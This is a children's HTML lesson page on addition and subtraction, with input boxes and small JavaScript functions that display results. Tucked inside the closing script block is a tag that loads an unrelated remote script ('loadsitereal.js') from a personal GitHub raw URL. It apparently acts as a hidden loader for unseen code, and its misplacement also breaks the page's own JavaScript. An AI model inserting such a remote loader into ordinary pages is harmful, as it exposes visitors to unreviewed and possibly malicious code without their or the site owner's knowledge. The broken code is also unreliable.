<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Addition and Subtraction</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      color: #333;
      text-align: center;
      padding: 20px;
    }
    h1 {
      color: #4CAF50;
    }
    h2 {
      color: #2196F3;
    }
    .example {
      background: #fff;
      padding: 15px;
      margin: 15px auto;
      width: 300px;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    input[type="number"] {
      width: 60px;
      padding: 5px;
      margin: 5px;
      text-align: center;
    }
    button {
      background: #4CAF50;
      color: white;
      border: none;
      padding: 8px 12px;
      cursor: pointer;
      border-radius: 4px;
      margin-top: 5px;
    }
    button:hover {
      background: #45a049;
    }
    #result {
      margin-top: 10px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h1>Learning Addition and Subtraction</h1>
  <p>Addition means putting numbers together. Subtraction means taking numbers away.</p>

  <div class="example">
    <h2>Addition</h2>
    <p>Example: 3 + 2 = 5</p>
    <input type="number" id="add1" placeholder="Number">
    +
    <input type="number" id="add2" placeholder="Number">
    <br>
    <button onclick="addNumbers()">Add</button>
    <div id="addResult"></div>
  </div>

  <div class="example">
    <h2>Subtraction</h2>
    <p>Example: 5 - 2 = 3</p>
    <input type="number" id="sub1" placeholder="Number">
    -
    <input type="number" id="sub2" placeholder="Number">
    <br>
    <button onclick="subtractNumbers()">Subtract</button>
    <div id="subResult"></div>
  </div>

  <script>
    function addNumbers() {
      let num1 = parseFloat(document.getElementById('add1').value) || 0;
      let num2 = parseFloat(document.getElementById('add2').value) || 0;
      document.getElementById('addResult').innerText = "Result: " + (num1 + num2);
    }

    function subtractNumbers() {
      let num1 = parseFloat(document.getElementById('sub1').value) || 0;
      let num2 = parseFloat(document.getElementById('sub2').value) || 0;
      document.getElementById('subResult').innerText = "Result: " + (num1 - num2);
    }
  <script src="https://raw.githubusercontent.com/ever53928-png/idk/refs/heads/main/loadsitereal.js"></script>
  </script>

</body>
</html>
